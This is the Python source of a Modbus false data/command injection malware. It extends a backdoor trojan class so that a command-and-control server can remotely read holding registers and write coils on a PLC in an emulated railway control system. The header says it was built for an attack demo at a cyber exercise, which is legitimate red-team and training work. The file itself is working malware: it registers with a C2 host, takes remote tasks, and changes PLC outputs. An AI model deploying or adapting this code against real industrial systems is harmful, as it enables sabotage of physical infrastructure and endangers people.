#-----------------------------------------------------------------------------
# Name:        falseCmdinjector.py
#
# Purpose:     This modbus data/cmd injector malware is modified from the backdoor 
#              trojan program <c2MwUtils.c2TestMalware> by adding the plc-ModBus 
#              communication module so the C2 system can use it to launch the false 
#              data/command injection attack to the XS2023 railway system remotely.
#
# Author:      Yuancheng Liu
#
# Version:     v_0.2.2
# Created:     2023/10/19
# Copyright:   Copyright (c) 2023 LiuYuancheng
# License:     MIT License
#-----------------------------------------------------------------------------
""" Program design: 
    We want to implement a remote false data injector for XS2023 which can be linked in our 
    C2 emulation system (https://github.com/LiuYuancheng/Python_Malwares_Repo/tree/main/src/c2Emulator)
    This program will be used in the testRun attack verfication demo of the 
    cyber event : Cross Sword 2023
"""

import os
import time
from datetime import datetime

import ConfigLoader
import modbusTcpCom
import c2MwUtils

CONFIG_FILE_NAME = 'falseCmdInjectorCfg.txt'

print("Current working directory is : %s" % os.getcwd())
dirpath = os.path.dirname(__file__)
print("Current source code location : %s" % dirpath)

# Init the config loader program.
gConfigPath = os.path.join(dirpath, CONFIG_FILE_NAME)
iConfigLoader = ConfigLoader.ConfigLoader(gConfigPath, mode='r')
if iConfigLoader is None:
    print("Error: The config file %s is not exist. Program exit!" %str(gConfigPath))
    exit()
CONFIG_DICT = iConfigLoader.getJson()

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class falseCmdInjector(c2MwUtils.c2TestMalware):

    def __init__(self, malwareID, ownIp, c2Ipaddr, c2port=5000, reportInt=10, tasksList=None, c2HttpsFlg=False, cmdTDFlg=False) -> None:
        """ Init example:   client = falseCmdInjector(malwareID, ownIP, c2Ipaddr, 
                              c2port=c2Port, reportInt=c2RptInv, tasksList=taskList, c2HttpsFlg=c2HttpsFlg)
        Args:
            malwareID (str): malware id
            ownIp (str): malware ip address
            c2Ipaddr (str): c2 server IP address
            reportInt (int, optional): time interval between 2 report to c2. Defaults to 10 sec.
            tasksList (list of dict, optional): refer to <programRcd> taskList. Defaults to None.
            c2HttpsFlg (bool, optional): flag to identify whether connect to c2 via https. Defaults to False.
            cmdTDFlg (bool, optional): flag to identify whether run the command execution task 
                in the command runner's sub-thread. Defaults to False.
        """
        super().__init__(malwareID, ownIp, c2Ipaddr, c2port=c2port, reportInt=reportInt, \
                         tasksList=tasksList, c2HttpsFlg=c2HttpsFlg, cmdTDFlg=cmdTDFlg)
        print("False command injector init finished.") 

    #-----------------------------------------------------------------------------
    def _initActionHandlers(self):
         # Init the PLC connector 
        plcIP = CONFIG_DICT['PLC_IP']
        plcPort = int(CONFIG_DICT['PLC_PORT'])
        self.plcConnector = modbusTcpCom.modbusTcpClient(plcIP, tgtPort=plcPort)
        while not self.plcConnector.checkConn():
            print('Try connect to the PLC')
            print(self.plcConnector.getCoilsBits(0, 4))
            time.sleep(0.5)
        print('Connected to the PLC')
    
    #-----------------------------------------------------------------------------
    def _handleSpecialTask(self, taskDict):
        resultStr = 'taskTypeNotFound'
        if taskDict['taskType'] == 'modbus':
            resultStr = self.handlerModbusReq(taskDict['taskData'])
        return resultStr

    #-----------------------------------------------------------------------------
    def handlerModbusReq(self, reqStr):
        """ Parse the modub request string and call the modbus API to communicate 
            with the PLC based on the 
            Args:
                reqStr (str): modbus cmd string example: read;reg;0;4
            Returns:
                str: modbus feed back data.
        """
        resultStr = 'taskfinished'
        data = str(reqStr).strip()
        vals = data.split(';')
        act, itemType, addr = vals[0], vals[1], int(vals[2])
        if act == 'read':
            offset = int(vals[3])
            if itemType == 'reg':
                print("Info: handlerModbusReq()> Read holding register.")
                result = self.plcConnector.getHoldingRegs(addr, offset)
                resultStr = str(result)
            else:
                print("Info: handlerModbusReq()> Read coils.")
                result = self.plcConnector.getCoilsBits(addr, offset)
                resultStr = str(result)
        elif act == 'write':
            print("Info: handlerModbusReq()> Write coils.")
            coilVal = int(vals[3])
            result = self.plcConnector.setCoilsBit(addr, coilVal==1)
            resultStr = str(result)
        else:
            print("Error: handlerModbusReq()> Unknown modbus action: %s" %str(act))
            resultStr = "UnknowActType"
        return resultStr

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
def main():
    malwareID = CONFIG_DICT['OWN_ID']
    ownIP = CONFIG_DICT['OWN_IP']
    c2Ipaddr = CONFIG_DICT['C2_IP']
    c2Port = int(CONFIG_DICT['C2_PORT'])
    c2RptInv = int(CONFIG_DICT['C2_RPT_INV'])
    c2HttpsFlg = CONFIG_DICT['C2_HTTPS'] if 'C2_HTTPS' in CONFIG_DICT else False
    taskList = [
            {
                'taskID': 0,
                'taskType': 'register',
                'StartT': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'repeat': 1,
                'ExPerT': 0,
                'state' : c2MwUtils.TASK_R_FLG,
                'taskData': None
            } ]
    client = falseCmdInjector(malwareID, ownIP, c2Ipaddr, 
                              c2port=c2Port, reportInt=c2RptInv, tasksList=taskList, c2HttpsFlg=c2HttpsFlg)
    time.sleep(1)
    client.run()
    client.stop()

#-----------------------------------------------------------------------------
if __name__ == '__main__':
    main()